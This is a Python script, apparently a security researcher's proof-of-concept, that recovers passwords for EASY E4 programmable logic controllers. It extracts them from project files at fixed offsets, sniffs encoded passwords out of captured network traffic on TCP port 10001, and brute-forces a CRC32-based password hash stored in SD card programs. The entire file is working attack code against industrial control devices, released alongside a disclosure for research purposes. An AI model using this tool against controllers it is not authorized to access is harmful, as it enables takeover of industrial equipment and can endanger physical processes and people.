#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EASY PASSWORD RECOVERY

Recovering passwords from project files, network traffic or programs stored on a SD card (EASY E4).

For educational purposes only.
Use at your own risk and do not use without full consent of everyone involved.
"""
# Import 'built-in' modules
import argparse
import mmap
import string
# Import 'third-party' modules
import pyshark


def banner():
    """Show a fancy banner"""
    print('easy/easySoft password recovery tool')
    print('     by Manuel Stotz, SySS GmbH     ', '\n')



def decode_pw(encoded_pw):
    """Decodes the transferred password."""
    xored_tick_pw = 0x00
    tick_count = 0x00
    for i in range(0x00, 0x04):
        bitmask_even = 0x80
        bitmask_odd = 0x40
        for j in range(0x00, 0x08):
            xored_tick_pw = xored_tick_pw << 0x01
            xored_tick_pw += 0x01 if encoded_pw & (bitmask_even >> (i * 0x02)) else 0x00
            bitmask_even = bitmask_even << 0x08
            tick_count = tick_count >> 0x01
            tick_count += 0x80000000 if encoded_pw & (bitmask_odd >> (i * 0x02)) else 0x00
            bitmask_odd = bitmask_odd << 0x08
    xored_tick_pw = int.from_bytes(xored_tick_pw.to_bytes(4, byteorder='big'), 'little')
    crc32_pw = tick_count ^ xored_tick_pw
    return crc32_pw


def bruteforcer(encoded_pw, initial_value, charset=string.digits + string.ascii_uppercase):
    """Enhanced and fast brute-force mechanism."""
    lookup_table = [0x00000000, 0x04C11DB7, 0x09823B6E, 0x0D4326D9, 0x130476DC, 0x17C56B6B, 0x1A864DB2, 0x1E475005,
                    0x2608EDB8, 0x22C9F00F, 0x2F8AD6D6, 0x2B4BCB61, 0x350C9B64, 0x31CD86D3, 0x3C8EA00A, 0x384FBDBD,
                    0x4C11DB70, 0x48D0C6C7, 0x4593E01E, 0x4152FDA9, 0x5F15ADAC, 0x5BD4B01B, 0x569796C2, 0x52568B75,
                    0x6A1936C8, 0x6ED82B7F, 0x639B0DA6, 0x675A1011, 0x791D4014, 0x7DDC5DA3, 0x709F7B7A, 0x745E66CD,
                    0x9823B6E0, 0x9CE2AB57, 0x91A18D8E, 0x95609039, 0x8B27C03C, 0x8FE6DD8B, 0x82A5FB52, 0x8664E6E5,
                    0xBE2B5B58, 0xBAEA46EF, 0xB7A96036, 0xB3687D81, 0xAD2F2D84, 0xA9EE3033, 0xA4AD16EA, 0xA06C0B5D,
                    0xD4326D90, 0xD0F37027, 0xDDB056FE, 0xD9714B49, 0xC7361B4C, 0xC3F706FB, 0xCEB42022, 0xCA753D95,
                    0xF23A8028, 0xF6FB9D9F, 0xFBB8BB46, 0xFF79A6F1, 0xE13EF6F4, 0xE5FFEB43, 0xE8BCCD9A, 0xEC7DD02D,
                    0x34867077, 0x30476DC0, 0x3D044B19, 0x39C556AE, 0x278206AB, 0x23431B1C, 0x2E003DC5, 0x2AC12072,
                    0x128E9DCF, 0x164F8078, 0x1B0CA6A1, 0x1FCDBB16, 0x018AEB13, 0x054BF6A4, 0x0808D07D, 0x0CC9CDCA,
                    0x7897AB07, 0x7C56B6B0, 0x71159069, 0x75D48DDE, 0x6B93DDDB, 0x6F52C06C, 0x6211E6B5, 0x66D0FB02,
                    0x5E9F46BF, 0x5A5E5B08, 0x571D7DD1, 0x53DC6066, 0x4D9B3063, 0x495A2DD4, 0x44190B0D, 0x40D816BA,
                    0xACA5C697, 0xA864DB20, 0xA527FDF9, 0xA1E6E04E, 0xBFA1B04B, 0xBB60ADFC, 0xB6238B25, 0xB2E29692,
                    0x8AAD2B2F, 0x8E6C3698, 0x832F1041, 0x87EE0DF6, 0x99A95DF3, 0x9D684044, 0x902B669D, 0x94EA7B2A,
                    0xE0B41DE7, 0xE4750050, 0xE9362689, 0xEDF73B3E, 0xF3B06B3B, 0xF771768C, 0xFA325055, 0xFEF34DE2,
                    0xC6BCF05F, 0xC27DEDE8, 0xCF3ECB31, 0xCBFFD686, 0xD5B88683, 0xD1799B34, 0xDC3ABDED, 0xD8FBA05A,
                    0x690CE0EE, 0x6DCDFD59, 0x608EDB80, 0x644FC637, 0x7A089632, 0x7EC98B85, 0x738AAD5C, 0x774BB0EB,
                    0x4F040D56, 0x4BC510E1, 0x46863638, 0x42472B8F, 0x5C007B8A, 0x58C1663D, 0x558240E4, 0x51435D53,
                    0x251D3B9E, 0x21DC2629, 0x2C9F00F0, 0x285E1D47, 0x36194D42, 0x32D850F5, 0x3F9B762C, 0x3B5A6B9B,
                    0x0315D626, 0x07D4CB91, 0x0A97ED48, 0x0E56F0FF, 0x1011A0FA, 0x14D0BD4D, 0x19939B94, 0x1D528623,
                    0xF12F560E, 0xF5EE4BB9, 0xF8AD6D60, 0xFC6C70D7, 0xE22B20D2, 0xE6EA3D65, 0xEBA91BBC, 0xEF68060B,
                    0xD727BBB6, 0xD3E6A601, 0xDEA580D8, 0xDA649D6F, 0xC423CD6A, 0xC0E2D0DD, 0xCDA1F604, 0xC960EBB3,
                    0xBD3E8D7E, 0xB9FF90C9, 0xB4BCB610, 0xB07DABA7, 0xAE3AFBA2, 0xAAFBE615, 0xA7B8C0CC, 0xA379DD7B,
                    0x9B3660C6, 0x9FF77D71, 0x92B45BA8, 0x9675461F, 0x8832161A, 0x8CF30BAD, 0x81B02D74, 0x857130C3,
                    0x5D8A9099, 0x594B8D2E, 0x5408ABF7, 0x50C9B640, 0x4E8EE645, 0x4A4FFBF2, 0x470CDD2B, 0x43CDC09C,
                    0x7B827D21, 0x7F436096, 0x7200464F, 0x76C15BF8, 0x68860BFD, 0x6C47164A, 0x61043093, 0x65C52D24,
                    0x119B4BE9, 0x155A565E, 0x18197087, 0x1CD86D30, 0x029F3D35, 0x065E2082, 0x0B1D065B, 0x0FDC1BEC,
                    0x3793A651, 0x3352BBE6, 0x3E119D3F, 0x3AD08088, 0x2497D08D, 0x2056CD3A, 0x2D15EBE3, 0x29D4F654,
                    0xC5A92679, 0xC1683BCE, 0xCC2B1D17, 0xC8EA00A0, 0xD6AD50A5, 0xD26C4D12, 0xDF2F6BCB, 0xDBEE767C,
                    0xE3A1CBC1, 0xE760D676, 0xEA23F0AF, 0xEEE2ED18, 0xF0A5BD1D, 0xF464A0AA, 0xF9278673, 0xFDE69BC4,
                    0x89B8FD09, 0x8D79E0BE, 0x803AC667, 0x84FBDBD0, 0x9ABC8BD5, 0x9E7D9662, 0x933EB0BB, 0x97FFAD0C,
                    0xAFB010B1, 0xAB710D06, 0xA6322BDF, 0xA2F33668, 0xBCB4666D, 0xB8757BDA, 0xB5365D03, 0xB1F740B4]

    pw_candidate = []
    internals = []
    encoded_pw_tmp = encoded_pw
    for i in range(0, 3):
        last_key_byte = encoded_pw_tmp & 0xFF
        index = 0
        for index in range(0, len(lookup_table)):
            if lookup_table[index] & 0xFF == last_key_byte:
                break
        encoded_pw_tmp = (encoded_pw_tmp ^ lookup_table[index]) >> 8
        internals.append(encoded_pw_tmp)
    pw_encode = lambda enc_pw, pw: ((enc_pw << 0x8) & 0xFFFFFFFF) ^ lookup_table[(enc_pw >> 0x18) ^ pw]
    for char_1 in charset:
        for char_2 in charset:
            for char_3 in charset:
                encoded_pw_candidate_tmp = initial_value
                encoded_pw_candidate_tmp = pw_encode(encoded_pw_candidate_tmp, ord(char_1))
                encoded_pw_candidate_tmp = pw_encode(encoded_pw_candidate_tmp, ord(char_2)) # 2587546148
                encoded_pw_candidate_tmp = pw_encode(encoded_pw_candidate_tmp, ord(char_3))
                mask = 0xFF
                if (encoded_pw_candidate_tmp & mask) == (internals[2] & mask):
                    for char_4 in charset:
                        encoded_pw_candidate_tmp_c4 = encoded_pw_candidate_tmp
                        encoded_pw_candidate_tmp_c4 = pw_encode(encoded_pw_candidate_tmp_c4, ord(char_4))
                        mask2 = 0xFFFF
                        if (encoded_pw_candidate_tmp_c4 & mask2) == (internals[1] & mask2):
                            for char_5 in charset:
                                encoded_pw_candidate_tmp_c5 = encoded_pw_candidate_tmp_c4
                                encoded_pw_candidate_tmp_c5 = pw_encode(encoded_pw_candidate_tmp_c5, ord(char_5))
                                mask3 = 0xFFFFFF
                                if (encoded_pw_candidate_tmp_c5 & mask3) == (internals[0] & mask3):
                                    for char_6 in charset:
                                        encoded_pw_candidate_tmp_c6 = encoded_pw_candidate_tmp_c5
                                        encoded_pw_candidate_tmp_c6 = pw_encode(encoded_pw_candidate_tmp_c6, ord(char_6))
                                        if encoded_pw_candidate_tmp_c6 == encoded_pw:
                                            pw_candidate.append(char_1 + char_2 + char_3 + char_4 + char_5 + char_6)

    return pw_candidate


def bruteforce_from_pcap(file, port=10001):
    """Extract and bruteforce passwords from pcap."""
    cap = pyshark.FileCapture(file, display_filter=f'tcp.dstport == {port} and data.data')
    for pkt in cap:
        if '20:00:25' in pkt.tcp.payload:
            encoded_pw = int.from_bytes(pkt.tcp.payload.binary_value[7:-2], 'big')
            decoded_pw = decode_pw(encoded_pw)
            pw_list = bruteforcer(decoded_pw, 0xFFFFFFFF)
            [print(f'[*] Found password candidate for encoded password {hex(encoded_pw)}/{hex(decoded_pw)}: {pw}') for pw in pw_list]
            print()


def bruteforce_from_file(file, offset):
    """Extract and bruteforce passwords from a program stored on a SD card."""
    input_file_handle = open(file, "r+b")
    mm = mmap.mmap(input_file_handle.fileno(), 0x00)
    pwcrc32 = int.from_bytes(mm[offset:offset+0x04], 'little')
    pw_list = bruteforcer(pwcrc32, 0xFFFFFFFF)
    [print(f'[*] Found password candidate for encoded password {pwcrc32:02x}: {pw}') for pw in pw_list]
    print()


def extract_from_file(file, offset):
    """Extract and password from a project file."""
    input_file_handle = open(file, "r+b")
    mm = mmap.mmap(input_file_handle.fileno(), 0x00)
    pw = int.from_bytes(mm[offset:offset+0x04], 'little')
    print(f"[*] Found password {pw:02x}")
    print()


if __name__ == '__main__':
    # Show banner
    banner()
    # Init argument parser
    parser = argparse.ArgumentParser(description='EASY E4 password recovery')
    parser.add_argument(dest='mode', nargs=1, type=str, choices=['PRJ', 'PCAP', 'SDC'],
                        help='input file is a easySoft project, a pcap/pcapng file or a SD card program')
    parser.add_argument(metavar='FILE', dest='prj_file', nargs=1, type=str,
                        help='input file')
    # Parse Arguments
    args = parser.parse_args()
    # Recover password
    print('[*] Start password recovery', '\n')
    if 'PRJ' in args.mode[0]:
        # Sloppy approach (offset from start of file)
        extract_from_file(args.prj_file[0], 0x1D6)
    elif 'PCAP' in args.mode[0]:
        bruteforce_from_pcap(args.prj_file[0])
    elif 'SDC' in args.mode[0]:
        # Sloppy approach (offset from start of file)
        bruteforce_from_file(args.prj_file[0], 0xB0)
    # Bye
    print('[*] Bye!')




